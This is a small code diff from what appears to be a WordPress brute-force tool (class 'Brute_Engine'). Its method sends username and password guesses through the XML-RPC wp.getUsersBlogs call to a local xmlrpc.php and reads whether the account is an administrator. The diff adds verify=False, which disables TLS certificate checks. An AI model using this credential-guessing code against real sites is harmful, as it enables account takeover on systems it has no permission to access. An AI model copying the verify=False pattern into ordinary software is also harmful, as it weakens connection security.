@@ -120,7 +120,7 @@ class Brute_Engine:
 	
 	def xmlrpc_check_admin(self, username, password):
 		post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + username + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
-		req = requests.post("http://127.0.0.1:8000/xmlrpc.php", data=post)
+		req = requests.post("http://127.0.0.1:8000/xmlrpc.php", data=post, verify=False)
 		regex = re.compile("isAdmin.*boolean.(\d)")
 		match = regex.findall(req.text)
 		if int(match[0]):
